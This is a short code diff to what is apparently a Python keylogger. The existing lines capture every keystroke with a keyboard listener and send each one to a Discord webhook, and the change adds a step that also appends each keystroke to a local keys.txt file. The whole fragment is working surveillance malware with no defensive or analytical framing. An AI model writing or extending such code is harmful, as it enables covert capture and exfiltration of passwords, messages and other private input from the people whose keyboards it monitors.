@@ -10,6 +10,10 @@ def on_press(key):
   # Send the key to the Discord webhook
   requests.post(webhook_url, json={"content": key_str})
 
+  # Write the key to the text file
+  with open("keys.txt", "a") as file:
+    file.write(key_str + "\n")
+
 # Create a keyboard listener
 listener = keyboard.Listener(on_press=on_press)
 
